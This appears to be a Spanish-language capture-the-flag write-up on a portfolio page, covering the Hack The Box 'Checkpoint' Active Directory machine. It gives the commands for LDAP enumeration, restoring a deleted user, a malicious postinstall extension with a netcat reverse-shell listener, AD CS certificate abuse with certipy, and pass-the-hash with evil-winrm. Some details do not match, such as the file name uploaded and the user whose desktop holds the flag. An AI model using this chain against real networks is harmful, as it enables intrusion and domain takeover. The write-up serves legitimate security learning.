@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<!-- 📝 PLANTILLA — duplica este archivo, renómbralo y edita el contenido.
+     Luego añade una entrada en /portfolio/posts.js con la ruta del nuevo archivo. -->
+<title>Checkpoint HTB — Andreco Juarez</title>
+<meta name="description" content="Resumen corto del write-up para SEO y previews." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../../static/styles/styles.css" />
+<link rel="stylesheet" href="../../static/styles/article.css" />
+</head>
+<body>
+<div class="grain"></div>
+
+<header class="nav">
+  <a href="../../index.html" class="logo"><span class="bracket">[</span>AndrecoJS<span class="cursor">_</span><span class="bracket">]</span></a>
+  <nav>
+    <a href="../../index.html#posts">publicaciones</a>
+    <a href="../../index.html#contact">contacto</a>
+  </nav>
+</header>
+
+<main class="article">
+<a class="back" href="../../index.html#posts">← volver a publicaciones</a>
+<header class="meta">
+    
+
+    <span class="kind">Write-up</span>
+    <h1>HTB — Checkpoint</h1>
+    <div class="sub">
+      <span>📅 16/06/2026</span>
+      <span class="dot-sep">·</span>
+      <span>⏱️ 2 min de lectura</span>
+      <span class="dot-sep">·</span>
+      <span>🎯 Dificultad: Medium</span>
+    </div>
+    <div class="tags-mini">
+      <span>HTB</span><span>Active Directory</span><span>Windows</span><span>AD CS</span><span>SMB</span><span>VSIX exploit</span>
+    </div>
+  </header>
+<p> Checkpoint es una máquina Active Directory que combina enumeración LDAP, abuso de permisos
+delegados, SMB y una escalada final mediante Active Directory Certificate Services (AD CS). Durante la
+resolución aprovecharemos permisos excesivos sobre un usuario eliminado para recuperar acceso a
+una cuenta privilegiada y posteriormente comprometer todo el dominio. </p>
+<h2>Reconocimiento</h2>
+<p>Comencé realizando un escaneo completo de puertos:</p>
+<pre><code>nmap -p- --min-rate 5000 10.129.16.196 -oN init.nmap</code></pre>
+<p>Posteriormente ejecuté detección de servicios y scripts NSE:</p>
+<pre><code>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.16.196 -oN
+services.nmap</code></pre>
+<p>Los resultados muestran claramente que nos encontramos frente a un Domain Controller.</p>
+<pre><code>53/tcp open dns 88/tcp open kerberos 389/tcp open ldap 445/tcp open microsoft-ds 5985/
+tcp open winrm 9389/tcp open adws</code></pre>
+<div class="callout"> <p> <strong>Hallazgo:</strong> la máquina expone múltiples servicios de Active
+Directory, incluyendo LDAP, Kerberos, SMB y WinRM. </p> </div>
+<h2>Enumeración LDAP</h2>
+<p>La máquina proporciona las siguientes credenciales iniciales:</p>
+<pre><code>alex.turner : Checkpoint2024!</code></pre>
+<p>Con ellas realizamos una enumeración completa del dominio mediante ldapdomaindump.</p>
+<pre><code>ldapdomaindump
+-u checkpoint.local\alex.turner
+-p 'Checkpoint2024!'
+ldap://10.129.16.196</code></pre>
+<p> Tras revisar los objetos del dominio y sus ACLs encontramos un hallazgo muy interesante. </p>
+<div class="callout"> <p> <strong>Hallazgo:</strong> el usuario <code>alex.turner</code> posee
+permisos <code>GenericAll</code> sobre el usuario <code>ryan.brooks</code>. </p> </div>
+<p> Al continuar revisando la información exportada observamos que <code>ryan.brooks</code> se
+encuentra eliminado dentro de Active Directory. </p>
+<p> Dado que contamos con permisos GenericAll sobre dicho objeto, procedemos a restaurar la cuenta
+y asignarle una nueva contraseña. </p>
+<p> Una vez recuperada la cuenta validamos el acceso al dominio utilizando las nuevas credenciales. </
+p>
+<h2>Enumeración SMB</h2>
+<p>Con la cuenta restaurada comenzamos la enumeración de recursos compartidos.</p>
+<pre><code>smbclient -L //10.129.16.196 -U ryan.brooks</code></pre>
+<p>Entre los recursos disponibles encontramos uno particularmente interesante:</p>
+<pre><code>DevDrop</code></pre>
+<p>Accedemos al recurso:</p>
+<pre><code>smbclient //10.129.16.196/DevDrop -U ryan.brooks</code></pre>
+<p> Tras revisar los archivos presentes observamos documentación y configuraciones relacionadas con
+un sistema automatizado de despliegue de extensiones. </p>
+<div class="callout"> <p> <strong>Hallazgo:</strong> la cuenta <code>ryan.brooks</code> posee
+permisos de escritura sobre <code>DevDrop</code>. </p> </div>
+<p> El servicio monitoriza continuamente nuevos paquetes, los extrae y ejecuta procesos de instalación
+automáticamente. </p>
+<h2>Obtención del Acceso Inicial</h2>
+<p> Analizando el mecanismo de despliegue descubrimos que las extensiones son simplemente
+archivos comprimidos que pueden incluir scripts de instalación. </p>
+<p> Uno de los eventos soportados es: </p>
+<pre><code>"postinstall"</code></pre>
+<p> Esto nos permite ejecutar comandos arbitrarios cuando el sistema procesa la extensión. </p>
+<p>Creamos una extensión maliciosa:</p>
+<pre><code>
+    { 
+        "name": "checkpoint",
+        "version": "1.0.0",
+        "scripts": { "postinstall": "powershell -c &ltpayload&gt" 
+    } }
+
+</code></pre>
+<p>Empaquetamos el contenido:</p>
+<pre><code>zip -r exploit.zip .</code></pre>
+<p>Preparamos un listener:</p>
+<pre><code>nc -lvnp 4444</code></pre>
+<p>Y subimos la extensión al recurso compartido:</p>
+<pre><code>put exploit.extension</code></pre>
+<p> Tras unos segundos el proceso automatizado detecta el paquete, ejecuta el script de instalación y
+obtenemos una shell sobre el controlador de dominio. </p>
+<pre><code>type C:\Users\ryan.brooks\Desktop\user.txt</code></pre>
+<h2>Escalada de Privilegios</h2>
+<p> Con acceso inicial procedemos a enumerar el entorno Active Directory utilizando BloodHound y
+Certipy. </p>
+<pre><code>certipy find
+-u ryan.brooks
+-p '&ltPASSWORD&gt'
+-d checkpoint.local</code></pre>
+<p> La enumeración revela una plantilla vulnerable dentro de Active Directory Certificate Services. </p>
+<div class="callout warn"> <p> La plantilla permite especificar Subject Alternative Name (SAN),
+posibilitando solicitar certificados para cualquier usuario del dominio. </p> </div>
+<h2>Abuso de AD CS</h2>
+<p> Solicitamos un certificado para la cuenta Administrator. </p>
+<pre><code>certipy req
+-u ryan.brooks
+-p '&ltPASSWORD&gt'
+-template &ltTEMPLATE&gt
+-upn administrator@checkpoint.local</code></pre>
+<p>Como resultado obtenemos:</p>
+<pre><code>administrator.pfx</code></pre>
+<p> Posteriormente utilizamos dicho certificado para autenticarnos y recuperar el hash NTLM del
+administrador. </p>
+<pre><code>certipy auth -pfx administrator.pfx</code></pre>
+<p> Con el hash en nuestro poder realizamos Pass-the-Hash utilizando Evil-WinRM. </p>
+<pre><code>evil-winrm
+-i 10.129.16.196
+-u Administrator
+-H &ltNTLM_HASH&gt</code></pre>
+<h2>Compromiso Total</h2>
+<p> La autenticación es exitosa y obtenemos privilegios de Domain Administrator sobre el controlador
+de dominio. </p>
+<pre><code>type C:\Users\max.palmer\Desktop\root.txt</code></pre>
+<div class="callout"> <p> <strong>Pwned:</strong> compromiso completo del dominio mediante
+restauración de usuario eliminado, abuso de SMB y explotación de AD CS. </p> </div>
+<h2>Conclusión</h2>
+<p> Checkpoint demuestra cómo una mala delegación de permisos en Active Directory puede terminar
+comprometiendo por completo una organización. La cadena de explotación se basa en la recuperación
+del usuario eliminado <code>ryan.brooks</code> gracias a permisos <code>GenericAll</code> de
+<code>alex.turner</code>, el abuso del recurso compartido <code>DevDrop</code> para conseguir
+ejecución remota de código y finalmente una escalada crítica mediante una plantilla vulnerable de
+Active Directory Certificate Services. </p>
+</main>
+
+<footer>
+  <p>© <span id="year"></span> Eduardo Andreco Juarez Salgado</p>
+</footer>
+
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
